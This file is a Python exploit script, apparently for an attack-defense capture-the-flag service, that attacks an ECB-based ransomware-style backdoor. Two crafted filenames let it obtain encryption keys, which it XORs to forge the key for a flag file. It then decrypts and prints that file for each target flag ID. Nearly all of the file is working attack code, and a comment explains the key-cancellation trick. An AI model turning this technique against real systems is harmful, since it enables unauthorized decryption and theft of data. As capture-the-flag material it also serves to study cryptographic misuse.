import sys
import os
import random
import string

try:
    from .connector import BackdoorConnector
except ImportError:
    from connector import BackdoorConnector
os.environ['PWNLIB_NOTERM'] = '1'


"""
KEY GENERATION: encrypt filename 16b-wise, then xor blocks. Encryption is ECB, so plain block cipher application.
aaaaaaaaaaaaaaaa bbbb.txt
key = enc(a) ^ enc(b)

We generate keys for two other names, and xor the result:
aaaaaaaaaaaaaaaa cccccccccccccccc   => key1
cccccccccccccccc bbbb.txt           => key2
key1 ^ key2 = (enc(a) ^ enc(c)) ^ (enc(c) ^ enc(b))
            = enc(a) ^ enc(b) ^ enc(c) ^ enc(c)
            = enc(a) ^ enc(b) ^ 0
            = enc(a) ^ enc(b)
            = key
"""


def xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def exploit(target, flag_ids):
    with BackdoorConnector(target, True) as connector:
        for flag_id in flag_ids:
            rndstring = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))
            fname1 = (flag_id[:16] + rndstring).encode()
            fname2 = (rndstring + flag_id[16:] + '.txt').encode()
            connector.check_command(b'RANSOM_MESSAGE\x00' + bytes([len(fname1)]) + fname1 + b'\x00')
            response = connector.check_command(b'RANSOM_ENCRYPT\x00' + fname1)
            assert response.startswith(b'OK. key=')
            key1 = response[8:]
            connector.check_command(b'RANSOM_MESSAGE\x00' + bytes([len(fname2)]) + fname2 + b'\x00')
            response = connector.check_command(b'RANSOM_ENCRYPT\x00' + fname2)
            assert response.startswith(b'OK. key=')
            key2 = response[8:]

            key = xor(key1, key2)
            print('KEY =', key)
            result = connector.check_command(b'RANSOM_DECRYPT\x00' + key + flag_id.encode() + '.txt'.encode())
            print('RESULT =', result)


if __name__ == '__main__':
    exploit(sys.argv[1], sys.argv[2].split(','))
